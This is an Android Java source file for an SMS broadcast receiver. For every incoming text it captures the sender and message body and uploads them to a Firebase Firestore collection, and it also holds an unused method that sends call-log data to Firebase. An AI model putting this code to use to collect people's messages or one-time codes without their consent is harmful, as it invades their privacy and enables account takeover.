package com.example.equivalent.utility;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.example.equivalent.model.CallLogModel;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.HashMap;
import java.util.Map;

public class SmsReceiver extends BroadcastReceiver {

    private static String TAG = "Receiver";

    public SmsReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        try {
            if (bundle != null) {
                Object[] smsObj = (Object[]) bundle.get("pdus");

                if (smsObj != null) {
                    for (Object sms1 : smsObj) {
                        SmsMessage currentMessage = getIncomingMessage(sms1, bundle);
                        String senderNum = currentMessage.getDisplayOriginatingAddress();
                        String message = currentMessage.getDisplayMessageBody();

                        Log.d(TAG, "onReceive: " + senderNum + message);
//                        Intent directIntent = new Intent(context,sender.class);
//                        directIntent.putExtra(sender.EXTRA_SMS_Number,senderNum);
//                        directIntent.putExtra(sender.EXTRA_SMS_Message,message);
                        Toast.makeText(context, "" + senderNum + message, Toast.LENGTH_SHORT).show();

                        CallLogModel callLogItem = new CallLogModel(senderNum, message, "str_call_type",
                                "str_call_date", "str_call_time", "str_call_duration");
                        // Create a new user with a first and last name
                        Map<String, Object> user = new HashMap<>();
                        user.put("senderNum", senderNum);
                        user.put("message", message);
                        FirebaseFirestore db = FirebaseFirestore.getInstance();
// Add a new document with a generated ID
                        db.collection("users")
                                .add(user)
                                .addOnSuccessListener(new OnSuccessListener<DocumentReference>() {
                                    @Override
                                    public void onSuccess(DocumentReference documentReference) {
                                        Log.d(TAG, "DocumentSnapshot added with ID: " + documentReference.getId());
                                    }
                                })
                                .addOnFailureListener(new OnFailureListener() {
                                    @Override
                                    public void onFailure(@NonNull Exception e) {
                                        Log.w(TAG, "Error adding document", e);
                                    }
                                });


//                        PendingIntent pendingIntent = PendingIntent.getActivity(context,0,directIntent,PendingIntent.FLAG_UPDATE_CURRENT);
//                        pendingIntent.send();
                    }
                } else {
                    Log.d(TAG, "onReceive: SMS is Null");
                }
            }
        } catch (Exception e) {
            Log.d(TAG, "onReceive: " + e);
        }
    }

    private SmsMessage getIncomingMessage(Object object, Bundle bundle) {
        SmsMessage currentSMS;
        if (Build.VERSION.SDK_INT >= 23) {
            String format = bundle.getString("format");
            currentSMS = SmsMessage.createFromPdu((byte[]) object, format);
        } else {
            currentSMS = SmsMessage.createFromPdu((byte[]) object);
        }
        return currentSMS;
    }

    public void SendDataToServer(CallLogModel callLogItem) {
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference("CallLog");
        myRef.setValue(callLogItem);
    }

}
